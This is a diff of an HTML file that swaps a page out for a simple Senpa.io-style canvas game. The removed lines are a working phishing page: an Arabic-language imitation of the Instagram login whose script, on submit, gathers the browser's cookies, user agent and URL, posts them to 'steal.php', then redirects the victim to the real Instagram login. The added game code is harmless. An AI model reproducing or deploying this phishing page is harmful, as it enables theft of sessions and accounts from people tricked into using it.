@@ -1,53 +1,111 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - تسجيل الدخول</title>
-    <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; margin: 0; padding: 0; }
-        .container { max-width: 350px; margin: 40px auto; background: white; border: 1px solid #dbdbdb; padding: 40px 40px 20px; }
-        .logo { text-align: center; margin-bottom: 30px; }
-        .logo img { width: 175px; }
-        input { width: 100%; padding: 9px 0; border: 1px solid #efefef; border-radius: 3px; background: #fafafa; margin-bottom: 6px; box-sizing: border-box; font-size: 14px; text-align: center; }
-        input:focus { outline: none; border-color: #b2b2b2; background: white; }
-        button { width: 100%; background: #0095f6; color: white; border: none; border-radius: 5px; padding: 7px 0; font-weight: 600; cursor: pointer; margin-top: 10px; }
-        button:hover { background: #007bb5; }
-        .forgot { text-align: center; margin-top: 15px; font-size: 12px; color: #00376b; text-decoration: none; }
-    </style>
+<meta charset="UTF-8">
+<title>Senpa.io Clone</title>
+<style>
+html,body{margin:0;overflow:hidden;background:#111}
+#ui{
+position:absolute;top:20px;left:20px;color:#fff;font-family:tahoma
+}
+#start{
+padding:10px 20px;font-size:18px
+}
+</style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
-        </div>
-        <form id="loginForm">
-            <input type="text" placeholder="رقم الهاتف أو البريد الإلكتروني أو اسم المستخدم" required>
-            <input type="password" placeholder="كلمة السر" required>
-            <button type="submit">تسجيل الدخول</button>
-        </form>
-        <a href="#" class="forgot">نسيت كلمة السر؟</a>
-    </div>
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // جمع جميع cookies
-            const cookies = document.cookie.split(';').map(c => c.trim()).join('; ');
-            
-            // إرسال البيانات إلى الخادم
-            fetch('steal.php', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: 'cookies=' + encodeURIComponent(cookies) + 
-                      '&userAgent=' + encodeURIComponent(navigator.userAgent) +
-                      '&url=' + encodeURIComponent(window.location.href)
-            }).then(() => {
-                // إعادة توجيه إلى Instagram الحقيقي
-                window.location.href = 'https://www.instagram.com/accounts/login/';
-            });
-        });
-    </script>
+<div id="ui">
+<input id="name" placeholder="اسم اللاعب">
+<button id="start">Play</button>
+</div>
+
+<canvas id="game"></canvas>
+
+<script>
+const canvas = document.getElementById("game");
+const ctx = canvas.getContext("2d");
+canvas.width = innerWidth;
+canvas.height = innerHeight;
+
+let mouse={x:0,y:0};
+addEventListener("mousemove",e=>{
+ mouse.x=e.clientX;
+ mouse.y=e.clientY;
+});
+
+class Cell{
+ constructor(x,y,r,name,color){
+  this.x=x;this.y=y;this.r=r;
+  this.name=name;this.color=color;
+ }
+ draw(){
+  ctx.beginPath();
+  ctx.arc(this.x,this.y,this.r,0,Math.PI*2);
+  ctx.fillStyle=this.color;
+  ctx.fill();
+  ctx.fillStyle="#fff";
+  ctx.font=this.r/2+"px Arial";
+  ctx.textAlign="center";
+  ctx.fillText(this.name,this.x,this.y+5);
+ }
+ move(){
+  let dx=mouse.x-this.x;
+  let dy=mouse.y-this.y;
+  let d=Math.hypot(dx,dy);
+  this.x+=dx/d*2;
+  this.y+=dy/d*2;
+ }
+}
+
+class Food{
+ constructor(){
+  this.x=Math.random()*5000;
+  this.y=Math.random()*5000;
+  this.r=5;
+ }
+ draw(){
+  ctx.beginPath();
+  ctx.arc(this.x,this.y,this.r,0,Math.PI*2);
+  ctx.fillStyle="lime";
+  ctx.fill();
+ }
+}
+
+let player;
+let foods=[];
+for(let i=0;i<400;i++)foods.push(new Food());
+
+function start(){
+ let n=document.getElementById("name").value||"Player";
+ player=new Cell(0,0,30,n,"cyan");
+ document.getElementById("ui").style.display="none";
+ requestAnimationFrame(loop);
+}
+
+document.getElementById("start").onclick=start;
+
+function loop(){
+ ctx.setTransform(1,0,0,1,0,0);
+ ctx.clearRect(0,0,canvas.width,canvas.height);
+
+ ctx.translate(canvas.width/2-player.x,canvas.height/2-player.y);
+
+ foods.forEach((f,i)=>{
+  f.draw();
+  let d=Math.hypot(player.x-f.x,player.y-f.y);
+  if(d<player.r){
+   player.r+=0.3;
+   foods[i]=new Food();
+  }
+ });
+
+ player.move();
+ player.draw();
+
+ requestAnimationFrame(loop);
+}
+</script>
+
 </body>
 </html>
